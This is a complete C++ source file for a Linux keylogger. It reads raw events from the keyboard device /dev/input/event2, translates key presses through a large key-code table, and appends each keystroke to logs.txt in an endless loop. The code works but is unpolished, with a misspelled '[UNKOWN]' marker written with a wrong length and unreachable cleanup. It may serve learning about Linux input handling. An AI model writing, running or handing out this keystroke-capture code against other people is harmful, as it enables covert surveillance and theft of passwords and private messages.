#include <iostream>               // For cout and cin
#include <unordered_map>          // To map input codes with real keys
#include <string>                 // To user strings
#include <fcntl.h>                // To use open() system call
#include <unistd.h>               // To use read() and close() system call
#include <linux/input.h>          // To use input_event struct
#include <cstdlib>                // To use exit()                        

std::unordered_map<__u16, std::string> keyMap = {
    // Numbers
    {KEY_1, "1"},
    {KEY_2, "2"},
    {KEY_3, "3"},
    {KEY_4, "4"},
    {KEY_5, "5"},
    {KEY_6, "6"},
    {KEY_7, "7"},
    {KEY_8, "8"},
    {KEY_9, "9"},
    {KEY_0, "0"},
    
    // Letters (lowercase)
    {KEY_Q, "q"},
    {KEY_W, "w"},
    {KEY_E, "e"},
    {KEY_R, "r"},
    {KEY_T, "t"},
    {KEY_Y, "y"},
    {KEY_U, "u"},
    {KEY_I, "i"},
    {KEY_O, "o"},
    {KEY_P, "p"},
    {KEY_A, "a"},
    {KEY_S, "s"},
    {KEY_D, "d"},
    {KEY_F, "f"},
    {KEY_G, "g"},
    {KEY_H, "h"},
    {KEY_J, "j"},
    {KEY_K, "k"},
    {KEY_L, "l"},
    {KEY_Z, "z"},
    {KEY_X, "x"},
    {KEY_C, "c"},
    {KEY_V, "v"},
    {KEY_B, "b"},
    {KEY_N, "n"},
    {KEY_M, "m"},
    
    // Symbols
    {KEY_MINUS, "-"},
    {KEY_EQUAL, "="},
    {KEY_LEFTBRACE, "["},
    {KEY_RIGHTBRACE, "]"},
    {KEY_SEMICOLON, ";"},
    {KEY_APOSTROPHE, "'"},
    {KEY_GRAVE, "`"},
    {KEY_BACKSLASH, "\\"},
    {KEY_COMMA, ","},
    {KEY_DOT, "."},
    {KEY_SLASH, "/"},
    {KEY_SPACE, " "},
    
    // Numpad (just numbers/symbols, no KP_ prefix)
    {KEY_KP0, "0"},
    {KEY_KP1, "1"},
    {KEY_KP2, "2"},
    {KEY_KP3, "3"},
    {KEY_KP4, "4"},
    {KEY_KP5, "5"},
    {KEY_KP6, "6"},
    {KEY_KP7, "7"},
    {KEY_KP8, "8"},
    {KEY_KP9, "9"},
    {KEY_KPMINUS, "-"},
    {KEY_KPPLUS, "+"},
    {KEY_KPDOT, "."},
    {KEY_KPSLASH, "/"},
    {KEY_KPASTERISK, "*"},
    {KEY_KPEQUAL, "="},
    
    // Special keys (descriptive names in brackets)
    {KEY_ENTER, "\n"},
    {KEY_KPENTER, "\n"},
    {KEY_TAB, "\t"},
    {KEY_BACKSPACE, "\b"},
    {KEY_ESC, "[ESC]"},
    {KEY_DELETE, "[DEL]"},
    {KEY_INSERT, "[INS]"},
    {KEY_HOME, "[HOME]"},
    {KEY_END, "[END]"},
    {KEY_PAGEUP, "[PGUP]"},
    {KEY_PAGEDOWN, "[PGDN]"},
    {KEY_UP, "[UP]"},
    {KEY_DOWN, "[DOWN]"},
    {KEY_LEFT, "[LEFT]"},
    {KEY_RIGHT, "[RIGHT]"},
    
    // Function keys
    {KEY_F1, "[F1]"},
    {KEY_F2, "[F2]"},
    {KEY_F3, "[F3]"},
    {KEY_F4, "[F4]"},
    {KEY_F5, "[F5]"},
    {KEY_F6, "[F6]"},
    {KEY_F7, "[F7]"},
    {KEY_F8, "[F8]"},
    {KEY_F9, "[F9]"},
    {KEY_F10, "[F10]"},
    {KEY_F11, "[F11]"},
    {KEY_F12, "[F12]"},
    {KEY_F13, "[F13]"},
    {KEY_F14, "[F14]"},
    {KEY_F15, "[F15]"},
    {KEY_F16, "[F16]"},
    {KEY_F17, "[F17]"},
    {KEY_F18, "[F18]"},
    {KEY_F19, "[F19]"},
    {KEY_F20, "[F20]"},
    {KEY_F21, "[F21]"},
    {KEY_F22, "[F22]"},
    {KEY_F23, "[F23]"},
    {KEY_F24, "[F24]"},
    
    // Modifier keys
    {KEY_LEFTSHIFT, "[SHIFT]"},
    {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_LEFTCTRL, "[CTRL]"},
    {KEY_RIGHTCTRL, "[CTRL]"},
    {KEY_LEFTALT, "[ALT]"},
    {KEY_RIGHTALT, "[ALT]"},
    {KEY_LEFTMETA, "[WIN]"},
    {KEY_RIGHTMETA, "[WIN]"},
    {KEY_CAPSLOCK, "[CAPS]"},
    {KEY_NUMLOCK, "[NUMLOCK]"},
    {KEY_SCROLLLOCK, "[SCROLL]"},
    
    // Media keys
    {KEY_MUTE, "[MUTE]"},
    {KEY_VOLUMEDOWN, "[VOL-]"},
    {KEY_VOLUMEUP, "[VOL+]"},
    {KEY_PLAYPAUSE, "[PLAY/PAUSE]"},
    {KEY_NEXTSONG, "[NEXT]"},
    {KEY_PREVIOUSSONG, "[PREV]"},
    {KEY_STOPCD, "[STOP]"},
    {KEY_RECORD, "[RECORD]"},
    {KEY_REWIND, "[REWIND]"},
    {KEY_FASTFORWARD, "[FFWD]"},
    
    // Additional keys
    {KEY_PRINT, "[PRINT]"},
    {KEY_SYSRQ, "[SYSRQ]"},
    {KEY_PAUSE, "[PAUSE]"},
    {KEY_MENU, "[MENU]"},
    {KEY_COMPOSE, "[COMPOSE]"}
};

void captureEvents(std::string &kbd_device){

    // Opening keyboard file in Read Mode
    int input_fd = open(kbd_device.c_str(), O_RDONLY, 0);

    // Checking if file opened successfully 
    if(input_fd == -1){
        std::cout << "Error opening input file" << '\n';
        exit(-1);
    }

    // Creating file to store captured keys
    int output_fd = open("logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);

    // Chekcing if file created and opened successfully
    if(output_fd == -1){
        std::cout << "Error creating log file" << '\n';
        close(input_fd);
        exit(-1);
    }

    // input_event object to make a buffer to store key inputs
    struct input_event inputs;

    while(1){

        // write(output_fd, "yakein", 7);
        
        // Reading from input_fd in inputs struct
        read(input_fd, &inputs, sizeof(inputs));
        
        // If input is not of a key type than ignore that 
        if(inputs.type != EV_KEY) continue;

        // Log only when key is perssed and ignore rest inputs
        if(inputs.value != 1) continue;

        // Searching the key code in keyMap
        auto it = keyMap.find(inputs.code);
        if(it != keyMap.end()){
            // std::cout << it->second << std::endl;
            write(output_fd, it->second.c_str(), it->second.size());
        }
        else{
            write(output_fd, "[UNKOWN]", 9);
        }

    }

    close(input_fd);
    close(output_fd);
}

int main(){
    // Hardcorded keyboard device file location
    std::string kbd_device = "/dev/input/event2";

    // Function to read input events and convert them in readable keys and write those in log.txt
    captureEvents(kbd_device);
}
